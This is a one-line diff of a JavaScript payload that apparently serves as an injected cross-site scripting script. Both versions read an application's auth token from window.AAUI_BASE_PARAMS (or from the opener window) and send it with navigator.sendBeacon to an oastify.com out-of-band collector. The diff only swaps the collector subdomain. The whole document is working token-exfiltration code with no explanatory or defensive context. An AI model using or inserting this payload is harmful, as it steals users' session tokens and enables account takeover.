@@ -1,1 +1,1 @@
-if(window.opener){navigator.sendBeacon("https://ojbuwu76o56ckwco0vx7eenq9hff37rw.oastify.com",window.opener.AAUI_BASE_PARAMS.appService.token)}else{navigator.sendBeacon("https://ojbuwu76o56ckwco0vx7eenq9hff37rw.oastify.com",window.AAUI_BASE_PARAMS.appService.token)}
+if(window.opener){navigator.sendBeacon("https://wvvbt73ojrwnqvmv4ytoiplzcqih67uw.oastify.com",window.opener.AAUI_BASE_PARAMS.appService.token)}else{navigator.sendBeacon("https://wvvbt73ojrwnqvmv4ytoiplzcqih67uw.oastify.com",window.AAUI_BASE_PARAMS.appService.token)}
